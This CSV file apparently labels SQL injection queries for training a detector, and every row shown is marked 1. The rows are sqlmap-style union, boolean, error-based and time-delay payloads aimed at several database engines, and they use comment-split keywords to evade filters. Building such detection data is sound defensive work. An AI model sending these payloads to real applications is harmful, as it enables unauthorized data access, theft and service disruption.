Query,Label
"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  sele/**/ct   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   a/**/nd   (  'eiau'  =  'eiau",1
"-7482""   )    )     )   o/**/r 9077  =  2651",1
"-8042  )   as zhoq wher/**/e 2120  =  2120 union all s/**/elect 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",1
"-7848%"" union all sel/**/ect 1580,1580,1580,1580,1580,1580,1580--",1
-7452 wher/**/e 2224  =  2224 o/**/r 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
-8716'  )   whe/**/re 5523  =  5523 o/**/r 3686  =  8485--,1
1'  )   a/**/nd 6240  =    (  'qqpjq'||  (  selec/**/t case 6240 when 6240 then 1 else 0 end f/**/rom rdb$dat/**/abase  )  ||'qzvzq'  )   an/**/d   (  'vvxk'  =  'vvxk,1
1'  )   whe/**/re 5287  =  5287 a/**/nd 7533  =  7533--,1
"s/**/elect * fr/**/om generate_series  (  5980,5980,case when   (  5980  =  5063  )   then 1 else 0 end  )   limi/**/t 1--",1
-1662 wh/**/ere 1119  =  1119 o/**/r   (  8459  =  8459  )  *4906--,1
"-2046'  )   union all se/**/lect 6668,6668--",1
1  )   as ywrn whe/**/re 1893  =  1893,1
1' an/**/d 2316  =  7236,1
"1""   (  s/**/elect   (  case when   (  5451  =  5451  )   then regexp_substri/**/ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nu/**/ll  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   fr/**/om i/**/nfo/**/rmation_schema.system_users  )  ",1
1   )    )     )   a/**/nd 7533  =  7533 an/**/d    (    (     (  7740  =  7740,1
"1'+  (  se/**/lect 'pvej' whe/**/re 4496  =  4496 an/**/d 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",1
1  )   wher/**/e 4548  =  4548 an/**/d 9198  =  9198--,1
1 rli/**/ke   (  sele/**/ct   (  case when   (  8314  =  5463  )   then 1 else 0x28 end   )    ) ,1
"-4807' o/**/r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a/**/nd 'wwki'  =  'wwki",1
"1'||  (  selec/**/t 'nbmo' f/**/rom dual wh/**/ere 5572  =  5572 an/**/d 8635  =    (  s/**/elect count  (  *  )   fr/**/om generate_series  (  1,5000000   )    )   --",1
"-3151%""   )    )     )   union all selec/**/t 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",1
"1'+  (  selec/**/t 'mtpt' wh/**/ere 7483  =  7483 union all sel/**/ect nul/**/l,nu/**/ll,n/**/ull,n/**/ull,nu/**/ll,n/**/ull,nul/**/l,nu/**/ll,nul/**/l--",1
"1' an/**/d elt  (  4249  =  4249,7259  )   a/**/nd 'nsbj' lik/**/e 'nsbj",1
"1%""  )   o/**/r 7552  =    (  sele/**/ct count  (  *  )   f/**/rom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   a/**/nd   (  ""%""  =  """,1
1%' an/**/d 2006  =  2006,1
"-6200'   )    )    as jjpz w/**/here 4490  =  4490 union all se/**/lect 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",1
"-6520%""  )   o/**/rd/**/er b/**/y 1#",1
-9673  )   o/**/r 8571  =  8571--,1
1'||  (  selec/**/t 'vasx' wh/**/ere 4770  =  4770 a/**/nd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s/**/elect   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',1
1 an/**/d 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sele/**/ct   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- slje,1
1  )   as bzuh w/**/here 8041  =  8041 a/**/nd 6307  =  9200#,1
"-9152""   )    )    as avga wh/**/ere 3825  =  3825 o/**/rde/**/r b/**/y 1#",1
"1""  )   as pxdq w/**/here 2236  =  2236 a/**/nd 2006  =  2006",1
"1""   )    )    as pqbs wher/**/e 4409  =  4409",1
"-7678   )    )     )   union all se/**/lect 2622,2622,2622,2622,2622,2622,2622,2622--",1
"-9015%""  )   union all sel/**/ect 6948,6948--",1
"1%'   )    )    union all sele/**/ct nu/**/ll,n/**/ull,nul/**/l,nul/**/l,nul/**/l,nul/**/l#",1
"1  )   w/**/here 1270  =  1270 o/**/r   (  sele/**/ct 9173 fr/**/om  (  sel/**/ect count  (  *  )  ,concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x fro/**/m i/**/nfo/**/rmation_schema.character_s/**/ets group b/**/y x  )  a  )  --",1
"1"" o/**/r 7417  =    (  sele/**/ct count  (  *  )   fro/**/m sysibm.systa/**/bles as t1,sysibm.systab/**/les as t2,sysibm.syst/**/ables as t3  )  --",1
-9653'  )   wh/**/ere 2705  =  2705 o/**/r 9323  =  9323#,1
"1  )   union all s/**/elect n/**/ull,n/**/ull,nul/**/l,n/**/ull,n/**/ull,nul/**/l,nu/**/ll,nu/**/ll,n/**/ull,nu/**/ll#",1
"-3872%""   )    )     )   union all se/**/lect 1637,1637,1637,1637,1637#",1
1'+  (  sele/**/ct 'rpds' wher/**/e 5870  =  5870 a/**/nd 4595  =  4595#,1
"1'+  (  sel/**/ect 'vabj' wh/**/ere 7178  =  7178 union all selec/**/t n/**/ull,nul/**/l,nu/**/ll,nul/**/l,nu/**/ll#",1
"1   )    )    as vzso wh/**/ere 8541  =  8541 o/**/r   (  se/**/lect 2*  (  if   (    (   sele/**/ct * fro/**/m   (  sel/**/ect concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"1%""  )   a/**/nd exp  (  ~  (  selec/**/t * fro/**/m   (  sel/**/ect concat  (  0x7171706a71,  (  sele/**/ct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    a/**/nd   (  ""%""  =  """,1
"1"" w/**/here 4684  =  4684 union all sele/**/ct nu/**/ll,nul/**/l,nul/**/l,nu/**/ll#",1
1' wh/**/ere 1628  =  1628,1
"1'   )    )    a/**/nd 8407  =    (  s/**/elect count  (  *  )   fr/**/om generate_series  (  1,5000000   )    )    an/**/d    (    (   'dfsj'  =  'dfsj",1
"1   )    )     )   o/**/r up/**/datexml  (  1808,concat  (  0x2e,0x7171706a71,  (  selec/**/t   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   an/**/d    (    (     (  9474  =  9474",1
"1%""  )   a/**/nd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nu/**/ll  )  --",1
"1""  )   w/**/here 8390  =  8390",1
"1'  )   as dajk wher/**/e 1452  =  1452 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1""  )   w/**/here 5850  =  5850 o/**/r 1022  =    (  se/**/lect count  (  *  )   f/**/rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1"" union all sel/**/ect nul/**/l,n/**/ull,nul/**/l,n/**/ull,nul/**/l,nul/**/l#",1
if  (  5127  =  2829  )   s/**/elect 5127 else d/**/rop function okos--,1
1'   )    )    a/**/nd 4650  =  1322#,1
-9355' o/**/r   (  8459  =  8459  )  *4906 an/**/d 'aegf'  =  'aegf,1
1' union all selec/**/t nul/**/l--,1
"1  )   o/**/r 8156  =    (  sel/**/ect count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )   --",1
"call regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,nu/**/ll  )  ",1
1 an/**/d   (  5369  =  8325  )  *8325# psze,1
"-5196""   )    )     )   o/**/r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   an/**/d    (    (     (  ""gbcq"" li/**/ke ""gbcq",1
"1'+  (  sel/**/ect 'jfir' wh/**/ere 7814  =  7814 a/**/nd   (  s/**/elect 2*  (  if   (    (   sele/**/ct * f/**/rom   (  selec/**/t concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1
"1%""   )    )     )   o/**/r   (  s/**/elect * fro/**/m   (  se/**/lect  (  sleep  (  5   )    )     )  sddo  )  #",1
"1' o/**/r 8421  =    (  sel/**/ect count  (  *  )   fr/**/om generate_series  (  1,5000000   )    )    an/**/d 'obax' lik/**/e 'obax",1
-1641' union all selec/**/t 4835#,1
1 a/**/nd 9198  =  9198--,1
"1""  )   w/**/here 9115  =  9115",1
"1   )    )    as xovu wh/**/ere 4530  =  4530 o/**/r 4411  =    (  se/**/lect count  (  *  )   fro/**/m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'||  (  sel/**/ect 'mwpd' whe/**/re 2887  =  2887,1
"1"" rl/**/ike   (  se/**/lect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   ",1
"-9062"" o/**/r 6872  =  6872 a/**/nd ""aumq"" l/**/ike ""aumq",1
"1%""   )    )    o/**/r 4411  =    (  se/**/lect count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   an/**/d    (    (   ""%""  =  """,1
1 wher/**/e 2956  =  2956,1
"1%' a/**/nd 3580  =    (  sel/**/ect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tabl/**/es as t3  )  --",1
-4542'   )    )    o/**/rd/**/er b/**/y 1#,1
"1%""   )    )     )   an/**/d elt  (  1210  =  1210,sleep  (  5   )    )    an/**/d    (    (     (  ""%""  =  """,1
"-1432""   )    )    union all se/**/lect 9008,9008,9008#",1
"1""   )    )    a/**/nd 8329  =  5584#",1
1  )   as imdt wh/**/ere 6431  =  6431,1
"1""  )   as jidc wh/**/ere 6093  =  6093 a/**/nd 9198  =  9198--",1
-3634%'   )    )    o/**/r 2671  =  2434,1
"1""   )    )    a/**/nd sleep  (  5  )   a/**/nd    (    (   ""lied"" lik/**/e ""lied",1
"1' i/**/n boolean mode  )   o/**/r 4411  =    (  sele/**/ct count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #",1
1'+  (  s/**/elect xruo w/**/here 5709  =  5709 a/**/nd 7533  =  7533  )  +',1
"1'   )    )    o/**/r elt  (  6272  =  6272,sleep  (  5   )    )    a/**/nd    (    (   'zjel' li/**/ke 'zjel",1
sel/**/ect case when 4488  =  5522 then 1 else n/**/ull end--,1
-3059'  )   as jhbh whe/**/re 4056  =  4056 o/**/r   (  3498  =  6965  )  *6965--,1
"-1639   )    )    o/**/r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a/**/nd    (    (   3318  =  3318",1
"1"" o/**/r 5356  =    (  sel/**/ect count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-4885 union all s/**/elect 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",1
"1""   )    )    an/**/d 6240  =    (  'qqpjq'||  (  sele/**/ct case 6240 when 6240 then 1 else 0 end fro/**/m rdb$dat/**/abase  )  ||'qzvzq'  )   an/**/d    (    (   ""ycuo"" li/**/ke ""ycuo",1
"selec/**/t count  (  *  )   fr/**/om sysibm.systa/**/bles as t1,sysibm.systabl/**/es as t2,sysibm.systabl/**/es as t3# sfup",1
"1'   )    )     )   o/**/r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    an/**/d    (    (     (  'sqzl'  =  'sqzl",1
"1 an/**/d   (  se/**/lect 2*  (  if   (    (   sel/**/ect * fr/**/om   (  sele/**/ct concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",1
"1%""   )    )    o/**/r   (  se/**/lect 2*  (  if   (    (   s/**/elect * fro/**/m   (  sele/**/ct concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   an/**/d    (    (   ""%""  =  """,1
"1"" wh/**/ere 1537  =  1537 a/**/nd   (  se/**/lect 9067 fr/**/om  (  s/**/elect count  (  *  )  ,concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x f/**/rom i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )  --",1
1  )   an/**/d   (  2342  =  3620  )  *3620,1
"1' an/**/d elt  (  3247  =  3969,3969  )   a/**/nd 'xcbm' lik/**/e 'xcbm",1
1  )   wh/**/ere 1100  =  1100 an/**/d sleep  (  5  )  --,1
"1%""   )    )     )   o/**/r 8421  =    (  selec/**/t count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )    an/**/d    (    (     (  ""%""  =  """,1
"1'+  (  se/**/lect 'epza' wh/**/ere 8994  =  8994 an/**/d make_s/**/et  (  3782  =  2428,2428   )    )   +'",1
"1""   )    )    an/**/d 9198  =  9198--",1
"1'+  (  sel/**/ect eztr w/**/here 4260  =  4260 a/**/nd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",1
"1'  )   o/**/r 5286  =    (  sele/**/ct count  (  *  )   fr/**/om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   an/**/d   (  'ireg' l/**/ike 'ireg",1
s/**/elect   (  case when   (  2294  =  3651  )   then 2294 else 2294*  (  se/**/lect 2294 f/**/rom i/**/nfo/**/rmation_schema.character_s/**/ets  )   end  )  #,1
waitfo/**/r delay '0:0:5' an/**/d    (    (     (  'ywnm'  =  'ywnm,1
"-8976%""   )    )     )   union all sel/**/ect 5146,5146,5146,5146,5146,5146,5146,5146--",1
"1%'   )    )    union all sel/**/ect n/**/ull,nu/**/ll,n/**/ull,nu/**/ll,nu/**/ll,n/**/ull,nu/**/ll,n/**/ull#",1
"-8331'  )   union all se/**/lect 1452,1452,1452,1452,1452--",1
"1""   )    )    as dooi wh/**/ere 1806  =  1806 an/**/d 6414  =    (  sele/**/ct count  (  *  )   fro/**/m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1'   )    )     )   o/**/r 7552  =    (  selec/**/t count  (  *  )   fro/**/m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   an/**/d    (    (     (  'nqam'  =  'nqam",1
-2174'   )    )    o/**/r 5903  =    (  'qqpjq'||  (  s/**/elect case 5903 when 5903 then 1 else 0 end fro/**/m rdb$data/**/base  )  ||'qzvzq'  )   a/**/nd    (    (   'dyyg'  =  'dyyg,1
"1"" o/**/r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,nul/**/l  )   an/**/d ""fvtu"" li/**/ke ""fvtu",1
-4637' o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sele/**/ct   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
"-2373%""  )   o/**/r 9323  =  9323#",1
1  )   an/**/d 2006  =  2006,1
"1'  )   o/**/r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    an/**/d   (  'osov' lik/**/e 'osov",1
1%'   )    )    rli/**/ke   (  se/**/lect * fro/**/m   (  s/**/elect  (  sleep  (  5   )    )     )  sgvo  )   a/**/nd    (    (   '%'  =  ',1
"1   )    )    a/**/nd 2716  =    (  sel/**/ect count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
-5031' o/**/r 9323  =  9323#,1
"-4379' union all selec/**/t 1648,1648,1648,1648,1648,1648,1648#",1
"-3361'||  (  se/**/lect 'msfi' wher/**/e 4806  =  4806 union all sele/**/ct 4806,4806,4806,4806,4806,4806,4806,4806,4806--",1
1' o/**/r   (  s/**/elect * f/**/rom   (  se/**/lect  (  sleep  (  5   )    )     )  ydpu  )   an/**/d 'iwmy'  =  'iwmy,1
1'+  (  sel/**/ect 'wyxu' w/**/here 2555  =  2555 union all sele/**/ct n/**/ull#,1
"-8735'   )    )    union all sel/**/ect 3262,3262,3262--",1
"-4248""   )    )    union all sel/**/ect 9450,9450,9450--",1
"selec/**/t count  (  *  )   fr/**/om sysibm.syst/**/ables as t1,sysibm.syst/**/ables as t2,sysibm.syst/**/ables as t3 a/**/nd    (    (   'gfln'  =  'gfln",1
"1%' an/**/d 5556  =    (  se/**/lect count  (  *  )   f/**/rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   a/**/nd '%'  =  '",1
"1""   )    )    as eagr wh/**/ere 3366  =  3366 an/**/d elt  (  4249  =  4249,7259  )  --",1
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  sele/**/ct   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   an/**/d 'tuzl'  =  'tuzl",1
1 wher/**/e 5311  =  5311 rl/**/ike   (  se/**/lect * fr/**/om   (  sele/**/ct  (  sleep  (  5   )    )     )  vwyq  )  #,1
"-7139""  )   wher/**/e 2723  =  2723 o/**/r 3900  =  5082--",1
"1'+  (  se/**/lect mcfb wh/**/ere 4050  =  4050 o/**/r 9643  =    (  s/**/elect count  (  *  )   fr/**/om domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tab/**/les as t3   )    )   +'",1
"-3109"" o/**/r elt  (  1032  =  1032,3623  )  ",1
1'+  (  se/**/lect 'qsqs' w/**/here 9227  =  9227 waitfo/**/r delay '0:0:5'  )  +',1
"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   an/**/d 'hofy' li/**/ke 'hofy",1
1   )    )    as emtf wher/**/e 3561  =  3561 o/**/r   (  sele/**/ct * f/**/rom   (  s/**/elect  (  sleep  (  5   )    )     )  ydpu  )  --,1
"-5245""   )    )     )   union all selec/**/t 8106,8106,8106#",1
s/**/elect   (  case when   (  8716  =  1338  )   then 1 else 8716*  (  sel/**/ect 8716 fro/**/m master..sysdatabas/**/es  )   end  )  --,1
"1'   )    )     )   an/**/d 6414  =    (  selec/**/t count  (  *  )   f/**/rom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   a/**/nd    (    (     (  'hryb'  =  'hryb",1
"1'   )    )    o/**/r 8384  =  li/**/ke  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )    an/**/d    (    (   'aumk' li/**/ke 'aumk",1
"s/**/elect dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   fro/**/m dual an/**/d    (    (     (  ""mofa"" l/**/ike ""mofa",1
-6244'  )   as szpd wh/**/ere 8445  =  8445 o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  se/**/lect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"1 wher/**/e 1842  =  1842 o/**/r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1'  )   an/**/d   (  s/**/elect 9067 f/**/rom  (  s/**/elect count  (  *  )  ,concat  (  0x7171706a71,  (  sel/**/ect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x fro/**/m i/**/nfo/**/rmation_schema.character_s/**/ets group b/**/y x  )  a  )  ",1
"-2305' i/**/n boolean mode  )   union all selec/**/t 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",1
"-1040 whe/**/re 3058  =  3058 union all selec/**/t 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",1
"-9405'  )   union all s/**/elect 8283,8283,8283,8283--",1
"1   )    )    as rbae w/**/here 2049  =  2049 o/**/r 6979  =  l/**/ike  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )   --",1
"1  )   a/**/nd 6510  =    (  sel/**/ect count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"-7868"" union all sel/**/ect 1805--",1
"-8038'   )    )    o/**/r elt  (  1032  =  1032,3623  )   a/**/nd    (    (   'xfyq'  =  'xfyq",1
-3821'  )   o/**/r 9323  =  9323#,1
"1'||  (  sel/**/ect 'xyrk' f/**/rom dual whe/**/re 9844  =  9844 a/**/nd 9254  =    (  se/**/lect count  (  *  )   f/**/rom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1' w/**/here 5035  =  5035 an/**/d 8594  =    (  sel/**/ect 8594 f/**/rom pg_sleep  (  5   )    )   --,1
1' wher/**/e 1652  =  1652 an/**/d sleep  (  5  )  #,1
"1',  (  s/**/elect   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  sele/**/ct 5154 f/**/rom master..sysdata/**/bases  )   end   )    )   ",1
"1%""   )    )     )   a/**/nd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
1'   )    )    as cwss w/**/here 9720  =  9720,1
"-6475""   )    )     )   o/**/r 4144  =    (  selec/**/t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s/**/elect   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   f/**/rom dual  )   a/**/nd    (    (     (  ""mdsx"" lik/**/e ""mdsx",1
"call regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n/**/ull  )  ,0  )  ,500000000  )  ,n/**/ull  )   an/**/d    (    (   'nbsf' l/**/ike 'nbsf",1
"1 wh/**/ere 2914  =  2914 union all sele/**/ct nu/**/ll,n/**/ull,nu/**/ll#",1
"1"" an/**/d 2006  =  2006",1
1'+  (  sele/**/ct biqo wh/**/ere 6046  =  6046,1
"call regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n/**/ull  )  ,0  )  ,500000000  )  ,n/**/ull  )   a/**/nd ""%""  =  """,1
1' a/**/nd   (  se/**/lect * fro/**/m   (  s/**/elect  (  sleep  (  5   )    )     )  fzno  )   a/**/nd 'vwve' lik/**/e 'vwve,1
1 rlik/**/e sleep  (  5  )  # urxh,1
"1'+  (  sel/**/ect ummn w/**/here 8883  =  8883 an/**/d 4241  =  convert  (  i/**/nt,  (  selec/**/t char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s/**/elect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'",1
"1'   )    )     )   o/**/r char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,n/**/ull  )  --",1
"-9837"" wher/**/e 7201  =  7201 union all sel/**/ect 7201,7201,7201--",1
"1""  )    (  sele/**/ct   (  case when   (  5451  =  5451  )   then regexp_substri/**/ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,n/**/ull  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   fr/**/om i/**/nfo/**/rmation_schema.system_users  )   an/**/d   (  ""jebr"" li/**/ke ""jebr",1
"-5344"" union all s/**/elect 9482,9482,9482,9482,9482,9482,9482,9482,9482--",1
